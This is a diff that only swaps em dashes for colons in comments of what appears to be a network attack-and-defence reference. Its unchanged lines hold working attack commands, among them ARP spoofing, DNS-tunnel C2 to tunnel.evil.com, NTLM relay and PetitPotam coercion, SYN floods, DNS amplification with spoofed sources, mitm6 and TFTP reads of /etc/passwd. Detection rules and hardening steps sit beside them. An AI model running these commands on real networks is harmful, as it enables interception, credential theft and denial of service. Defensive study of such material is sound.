@@ -227,7 +227,7 @@ net.sniff on
 # ettercap (GUI or CLI)
 ettercap -T -q -i eth0 -M arp:remote /192.168.1.100// /192.168.1.1//
 
-# Scapy — forge ARP reply
+# Scapy: forge ARP reply
 from scapy.all import *
 # Tell 192.168.1.100 that 192.168.1.1 is at attacker MAC
 pkt = ARP(op=2, pdst="192.168.1.100", psrc="192.168.1.1",
@@ -241,7 +241,7 @@ sendp(Ether(dst="aa:bb:cc:dd:ee:ff")/pkt, iface="eth0", loop=1, inter=2)
 DAI is a Cisco IOS / NX-OS switch feature that validates ARP packets against a DHCP snooping binding table. ARP packets with MAC/IP pairs not in the binding table are dropped.
 
 ```
-# Cisco IOS — enable DAI per VLAN
+# Cisco IOS: enable DAI per VLAN
 ip arp inspection vlan 10,20
 ip arp inspection vlan 10,20 logging acl-match acl-permit
 
@@ -297,7 +297,7 @@ switchport trunk allowed vlan remove 1
 The Content Addressable Memory (CAM) table maps MAC addresses to switch ports. Flooding the CAM table with thousands of forged MAC addresses fills it, causing the switch to fail open (flood all frames to all ports like a hub).
 
 ```bash
-# macof tool (dsniff suite) — generate random MAC flood
+# macof tool (dsniff suite): generate random MAC flood
 macof -i eth0 -n 10000
 
 # Detection: monitor CAM table utilization
@@ -325,12 +325,12 @@ bpdu = Dot3(dst="01:80:c2:00:00:00", src="de:ad:be:ef:00:01") / \
            bridgeid=0, bridgemac="de:ad:be:ef:00:01")
 sendp(bpdu, iface="eth0", loop=1, inter=2)
 
-# Prevention: BPDU Guard — shuts port if BPDU received on access port
+# Prevention: BPDU Guard, shuts port if BPDU received on access port
 interface range GigabitEthernet0/1-24
  spanning-tree bpduguard enable
  spanning-tree portfast
 
-# Root Guard — prevents port from becoming root bridge
+# Root Guard: prevents port from becoming root bridge
 interface GigabitEthernet0/25
  spanning-tree guard root
 
@@ -343,7 +343,7 @@ spanning-tree portfast bpduguard default
 Attackers spoof MAC addresses to bypass port security or impersonate a legitimate device.
 
 ```bash
-# Linux — change MAC
+# Linux: change MAC
 ip link set dev eth0 down
 ip link set dev eth0 address de:ad:be:ef:00:01
 ip link set dev eth0 up
@@ -353,7 +353,7 @@ show mac address-table dynamic     # check for sudden MAC changes on a port
 show interfaces GigabitEthernet0/2 | include Hardware  # physical MAC
 
 # Suricata rule for ARP MAC mismatch (requires ARP logging)
-# Monitor for MAC changes in NDR solution — ExtraHop, Darktrace, Corelight
+# Monitor for MAC changes in NDR solution: ExtraHop, Darktrace, Corelight
 ```
 
 ---
@@ -396,14 +396,14 @@ Protocols used: TXT records (largest payload, 255 bytes per record), NULL record
 
 Tools:
 ```bash
-# dnscat2 — bidirectional DNS tunnel for C2
+# dnscat2: bidirectional DNS tunnel for C2
 # Server (attacker controls authoritative NS for tunnel.evil.com)
 ruby dnscat2.rb --dns "domain=tunnel.evil.com,host=0.0.0.0"
 
 # Client (victim)
 ./dnscat2 tunnel.evil.com   # queries: <encoded_data>.tunnel.evil.com
 
-# iodine — IP-over-DNS tunnel
+# iodine: IP-over-DNS tunnel
 # Server:
 iodined -f 10.0.0.1 tunnel.evil.com   # assigns 10.0.0.1/24 to tunnel
 
@@ -414,15 +414,15 @@ iodine -f -P password tunnel.evil.com  # creates dns0 interface with 10.0.0.2
 Detection methods:
 
 ```
-# Zeek dns.log analysis — high query rate to single domain
+# Zeek dns.log analysis: high query rate to single domain
 # Query frequency (>10 queries/second to same subdomain)
 cat dns.log | zeek-cut query | sort | uniq -c | sort -rn | head -20
 
-# FQDN length — tunneling uses long encoded subdomains
+# FQDN length: tunneling uses long encoded subdomains
 # Normal: avg FQDN < 40 chars; tunneling: avg FQDN > 100 chars
 cat dns.log | zeek-cut query | awk '{print length, $0}' | sort -rn | head -20
 
-# Subdomain entropy — encoded data has high Shannon entropy
+# Subdomain entropy: encoded data has high Shannon entropy
 # Python: calculate entropy of subdomain label
 python3 -c "
 import math, collections
@@ -495,7 +495,7 @@ Detection:
 # Indicators: short TTL + many A records + high IP churn
 cat dns.log | zeek-cut query answers TTLs | grep -E "ttl.*[0-9]{1,2}$"
 
-# Passive DNS — track IP count per domain over time
+# Passive DNS: track IP count per domain over time
 # Commercial: Farsight DNSDB, VirusTotal Passive DNS, RiskIQ
 
 # SPL for fast flux detection
@@ -644,7 +644,7 @@ pkt = IP(src="192.168.1.1", dst="192.168.1.50") / \
 send(pkt)
 
 # Prevention:
-# Linux — disable ICMP redirect acceptance
+# Linux: disable ICMP redirect acceptance
 sysctl -w net.ipv4.conf.all.accept_redirects=0
 sysctl -w net.ipv4.conf.all.secure_redirects=0
 echo "net.ipv4.conf.all.accept_redirects=0" >> /etc/sysctl.conf
@@ -663,7 +663,7 @@ Prevention:
 # Computer Configuration → Administrative Templates → Windows Components → Internet Explorer
 # → Disable: Prevent the use of automatic proxy configuration scripts
 
-# Block WPAD DNS resolution — create internal DNS record for wpad pointing to localhost
+# Block WPAD DNS resolution: create internal DNS record for wpad pointing to localhost
 # or block in DNS firewall
 nslookup wpad   # should not resolve externally
 
@@ -698,8 +698,8 @@ Step 1: LLMNR/NBT-NS Poisoning with Responder
 When a Windows host attempts to resolve a name not found in DNS (typo, non-existent host), it falls back to LLMNR (Link-Local Multicast Name Resolution, UDP/5355) and NBT-NS (NetBIOS Name Service, UDP/137). Responder answers these multicast queries with the attacker's IP, triggering authentication.
 
 ```bash
-# Responder — poison LLMNR/NBT-NS, capture NTLM hashes
-# /etc/responder/Responder.conf — disable SMB/HTTP to allow relay (not capture)
+# Responder: poison LLMNR/NBT-NS, capture NTLM hashes
+# /etc/responder/Responder.conf: disable SMB/HTTP to allow relay (not capture)
 [Responder Core]
 SMB = Off
 HTTP = Off
@@ -711,7 +711,7 @@ responder -I eth0 -rdwP   # -r enable answers for rdp, -d enable answers for DHC
 Step 2: Relay with ntlmrelayx.py
 
 ```bash
-# impacket ntlmrelayx.py — relay NTLM auth to targets
+# impacket ntlmrelayx.py: relay NTLM auth to targets
 # Targets.txt: list of hosts where SMB signing is NOT required
 crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt   # find relay targets
 
@@ -725,7 +725,7 @@ ntlmrelayx.py -tf targets.txt -smb2support -t ldap://dc01.corp.local \
 # Relay to LDAPS for adding domain admin
 ntlmrelayx.py -t ldaps://dc01.corp.local --add-computer AttackPC --escalate-user AttackPC$
 
-# Relay to HTTP (ADCS — ESC8 attack)
+# Relay to HTTP (ADCS: ESC8 attack)
 ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp \
   --adcs --template DomainController
 ```
@@ -777,7 +777,7 @@ Get-WmiObject Win32_NetworkAdapterConfiguration |
 Set-SmbServerConfiguration -RequireSecuritySignature $true -Force
 Set-SmbClientConfiguration -RequireSecuritySignature $true -Force
 
-# Extended Protection for Authentication (EPA) — binds NTLM to TLS channel
+# Extended Protection for Authentication (EPA): binds NTLM to TLS channel
 # Required on IIS/Exchange/ADCS to prevent HTTP relay
 ```
 
@@ -796,7 +796,7 @@ nxc smb 192.168.1.0/24 -u username -p password --shares
 nxc smb 192.168.1.0/24 -u username -p password --users
 nxc smb 192.168.1.0/24 -u '' -p '' --shares   # null session
 
-# Detection: Windows Event ID 5145 — network share object access
+# Detection: Windows Event ID 5145, network share object access
 # Alert on: anonymous access to IPC$, access from unusual hosts/users
 ```
 
@@ -831,10 +831,10 @@ MS-RPRN PrinterBug (SpoolSample): The Print Spooler service (`spoolsv.exe`) expo
 python3 SpoolSample.py dc01.corp.local attacker.corp.local
 # DC's machine account authenticates to attacker (capture with Responder or relay)
 
-# PetitPotam — LSARPC/EFSR coercion (unauthenticated in original version)
+# PetitPotam: LSARPC/EFSR coercion (unauthenticated in original version)
 python3 PetitPotam.py -u '' -p '' attacker.corp.local dc01.corp.local
 
-# Coercer — multi-method coercion scanner
+# Coercer: multi-method coercion scanner
 coercer scan --target dc01.corp.local --listener attacker.corp.local
 
 # Prevention:
@@ -867,15 +867,15 @@ Amplification attacks use UDP protocols with small requests that generate large 
 ntpdc -c monlist <your-ntp-server>   # returns list of last 600 clients
 # Prevention: disable monlist: restrict default noquery; restrict -6 default noquery
 
-# Memcached amplification — check for open UDP Memcached
+# Memcached amplification: check for open UDP Memcached
 echo -e "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n" | nc -u -q 1 <ip> 11211
 # Prevention: bind Memcached to 127.0.0.1, disable UDP: memcached -U 0
 
-# hping3 — packet generation for testing
+# hping3: packet generation for testing
 hping3 -S --flood -V -p 80 target-ip   # SYN flood
 hping3 --udp --flood -p 53 target-ip    # UDP flood
 
-# Scapy — amplification simulation
+# Scapy: amplification simulation
 from scapy.all import *
 pkt = IP(src="victim-ip", dst="open-resolver")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="isc.org", qtype="ANY"))
 send(pkt, loop=1)  # responses go to victim
@@ -975,7 +975,7 @@ RTBH (Remotely Triggered Black Hole): Announce victim IP with community tag that
 
 Netflow DDoS detection:
 ```bash
-# nfdump — identify top destinations by packet rate (volumetric attack)
+# nfdump: identify top destinations by packet rate (volumetric attack)
 nfdump -r /var/flow/nfcapd.* -s dstip/pps -n 20 -o fmt:"%dA %bps %pps %Bytes"
 
 # Identify reflection sources (UDP with large response to spoofed IP)
@@ -1114,8 +1114,8 @@ MANRS (https://www.manrs.org) defines four actions for network operators:
 4. Global Validation: Publish routing data (ROAs) so others can validate your routes
 
 ```
-# BCP38 — Unicast Reverse Path Forwarding (uRPF)
-# Cisco IOS — strict uRPF on customer-facing interfaces
+# BCP38: Unicast Reverse Path Forwarding (uRPF)
+# Cisco IOS: strict uRPF on customer-facing interfaces
 interface GigabitEthernet0/1
  ip verify unicast source reachable-via rx    # strict mode
 
@@ -1126,10 +1126,10 @@ interface GigabitEthernet0/1
 ### BGP Monitoring
 
 ```bash
-# BGPmon — monitor your own prefixes for hijacks
+# BGPmon: monitor your own prefixes for hijacks
 # Sign up at bgpmon.net, configure alerts for your ASN/prefixes
 
-# RIPE RIS Streaming — real-time BGP updates
+# RIPE RIS Streaming: real-time BGP updates
 # Connect to RIS Live WebSocket: wss://ris-live.ripe.net/v1/ws/
 
 # Cloudflare Radar BGP hijack detection
@@ -1234,8 +1234,8 @@ EAP-TLS certificate validation bypass: If clients accept any certificate for RAD
 
 Prevention:
 ```
-# Windows Group Policy — enforce server certificate validation
-# HKLM\SOFTWARE\Microsoft\MSCHAPv2 — no, use GPO:
+# Windows Group Policy: enforce server certificate validation
+# HKLM\SOFTWARE\Microsoft\MSCHAPv2: no, use GPO:
 # Computer Config → Policies → Windows Settings → Security Settings → 
 # Wireless Network (IEEE 802.11) Policies
 # → Validate server certificate: enabled, specify trusted CAs, specify server names
@@ -1249,10 +1249,10 @@ Prevention:
 802.11 management frames (deauth, disassoc) are unauthenticated in WPA2. Attacker sends spoofed deauth frames to disconnect clients.
 
 ```bash
-# MDK4 — deauth/disassoc flood
+# MDK4: deauth/disassoc flood
 mdk4 wlan0mon d -b blacklist.txt   # deauth all clients from listed BSSIDs
 
-# 802.11w PMF (Protected Management Frames) — mitigates deauth attacks
+# 802.11w PMF (Protected Management Frames): mitigates deauth attacks
 # Require PMF on AP configuration:
 # hostapd.conf: ieee80211w=2 (required)
 # Client must support PMF (all WPA3 devices, most modern WPA2 devices)
@@ -1306,7 +1306,7 @@ DHCP Starvation:
 Attacker sends DHCPDISCOVER with random source MACs, exhausting the DHCP pool. Legitimate clients cannot obtain addresses. Tool: `gobbler`, `dhcpstarv`.
 
 ```bash
-# gobbler — DHCP pool exhaustion
+# gobbler: DHCP pool exhaustion
 gobbler -i eth0 -s 192.168.1.0 -e 192.168.1.254
 
 # Prevention: Port security (limits MACs per port, reduces exhaustion rate)
@@ -1317,7 +1317,7 @@ DHCPv6 Abuse / MITM6:
 Windows prefers DHCPv6 over DHCPv4 by default. If an attacker sends DHCPv6 ADVERTISE messages, Windows clients will request IPv6 configuration and use the attacker-provided DNS server for IPv6 DNS queries. Combined with WPAD, this enables MitM without touching IPv4.
 
 ```bash
-# MITM6 — rogue DHCPv6 + DNS for IPv6
+# MITM6: rogue DHCPv6 + DNS for IPv6
 mitm6 -d corp.local -i eth0   # Intercept DHCPv6, spoof DNS for corp.local
 
 # Combine with ntlmrelayx for relay attack
@@ -1335,10 +1335,10 @@ Router Advertisement (RA) Flooding:
 Attackers send forged IPv6 RA messages claiming to be the default router, providing attacker-controlled DNS server. Windows and Linux clients auto-configure based on RAs.
 
 ```bash
-# fake_router6 (THC-IPv6 toolkit) — rogue RA
+# fake_router6 (THC-IPv6 toolkit): rogue RA
 fake_router6 eth0 2001:db8::/64   # claim to be router for this prefix
 
-# RA Guard — prevents unauthorized RAs on access ports (RFC 6105)
+# RA Guard: prevents unauthorized RAs on access ports (RFC 6105)
 # Cisco IOS:
 ipv6 nd raguard policy RAGUARD_POLICY
  device-role host          # block RAs from this port
@@ -1437,7 +1437,7 @@ atftp --get --remote-file /etc/passwd tftp-server-ip /tmp/passwd
 ### NFS/SMB Misconfiguration
 
 ```bash
-# NFS — world-readable export detection
+# NFS: world-readable export detection
 showmount -e 192.168.1.10       # list exported filesystems
 mount -t nfs 192.168.1.10:/home /mnt/nfs   # mount if no_root_squash set
 
@@ -1473,7 +1473,7 @@ Key log files:
 | notice.log | Zeek notices | category, msg, src, dst |
 
 ```bash
-# Beaconing detection — C2 check-ins at regular intervals
+# Beaconing detection: C2 check-ins at regular intervals
 # Step 1: Extract connections to external IPs, compute intervals
 cat conn.log | zeek-cut ts id.orig_h id.resp_h | \
   awk '{print $2, $3, $1}' | sort | \
@@ -1482,7 +1482,7 @@ cat conn.log | zeek-cut ts id.orig_h id.resp_h | \
   awk '{sum+=$3; count++; if(count>5) print $1, $2, sum/count, count}' | \
   sort -k3 -n | head -20   # low variance = beaconing
 
-# Lateral movement — SMB connections between internal hosts
+# Lateral movement: SMB connections between internal hosts
 cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p service | \
   awk '$3 == 445 && /10\.|172\.|192\.168\./ {print}' | \
   sort | uniq -c | sort -rn | head -20
@@ -1520,7 +1520,7 @@ Key options:
 - `flowbits:set,name`: set flowbit for multi-rule detection
 
 ```
-# DNS tunneling — long subdomain label
+# DNS tunneling: long subdomain label
 alert dns any any -> any any (msg:"DNS Tunneling - Long Subdomain Label";
   dns.query; content:"."; pcre:"/[a-z0-9\-]{40,}\./iR"; 
   threshold: type limit, track by_src, count 5, seconds 60;
@@ -1532,14 +1532,14 @@ alert udp any 123 -> any any (msg:"NTP Monlist Amplification Response";
   threshold: type both, track by_dst, count 50, seconds 10;
   classtype:denial-of-service; sid:9001010; rev:1;)
 
-# Possible ARP spoofing — ARP reply storm
+# Possible ARP spoofing: ARP reply storm
 alert arp any any -> any any (msg:"ARP Reply Storm - Possible ARP Spoofing";
   arp.opcode:2;
   threshold: type both, track by_src, count 50, seconds 5;
   classtype:attempted-recon; sid:9001020; rev:1;)
 
-# NTLM relay — authentication to multiple SMB targets
-# (Use flowbits across connections — better done in SIEM)
+# NTLM relay: authentication to multiple SMB targets
+# (Use flowbits across connections: better done in SIEM)
 alert smb any any -> $HOME_NET 445 (msg:"SMB NTLM Auth - Possible Relay";
   content:"NTLMSSP"; content:"NTLMSSP_AUTH"; distance:0;
   threshold: type both, track by_src, count 5, seconds 10;
@@ -1585,7 +1585,7 @@ nfdump -r /var/flow/nfcapd.today -A srcip,dstip \
   # Compare against baseline of yesterday's dst IPs
   # New IPs = potential new C2
 
-# Lateral movement — internal SMB (445) connections
+# Lateral movement: internal SMB (445) connections
 nfdump -r /var/flow/nfcapd.* \
   "proto tcp and port 445 and src net 10.0.0.0/8 and dst net 10.0.0.0/8" | \
   awk '{print $1, $3, $4}' | sort | uniq -c | sort -rn | head 20
@@ -1621,7 +1621,7 @@ Full PCAP vs. Flow-only:
 # Selective capture: only capture when Suricata fires (via unified2 or EVE JSON)
 # Barnyard2 + pcap-capture module
 
-# Stenographer (Google) — full PCAP with indexed query
+# Stenographer (Google): full PCAP with indexed query
 # Query: "port 445 and host 192.168.1.50 and after 1h ago"
 stenoread 'port 445 and host 192.168.1.50 and after 1h ago' | \
   tcpdump -r - -w /tmp/smb_traffic.pcap
@@ -1705,7 +1705,7 @@ index=zeek sourcetype=zeek_arp arp.opcode="reply"
 | where ip_count > 1
 | sort -ip_count
 
-| DNS Tunneling detection — query entropy
+| DNS Tunneling detection: query entropy
 index=zeek sourcetype=zeek_dns
 | eval subdomain=mvindex(split(query,"."),0)
 | eval sdlen=len(subdomain)
